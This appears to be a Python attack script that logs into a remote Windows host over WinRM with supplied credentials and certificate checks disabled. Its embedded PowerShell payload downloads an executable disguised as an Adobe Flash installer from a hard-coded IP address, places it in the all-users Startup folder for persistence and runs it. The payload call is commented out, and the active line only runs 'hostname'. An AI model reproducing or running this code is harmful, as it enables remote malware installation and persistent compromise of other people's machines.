import winrm
import sys

ps_script =f"""
Invoke-WebRequest "http://3.129.147.121:8000/Flash_Adobe_Install.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Flash_Adobe_Install.exe"; 
Start-Process -NoNewWindow -FilePath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Flash_Adobe_Install.exe" 
"""

s = winrm.Session(
    f"https://{sys.argv[1]}:5986/wsman", 
    auth=(sys.argv[2], sys.argv[3]), 
    server_cert_validation='ignore'
)
#r = s.run_ps(ps_script)
r = s.run_ps("hostname")
print (r.std_out.decode())
#print (r.std_err.decode())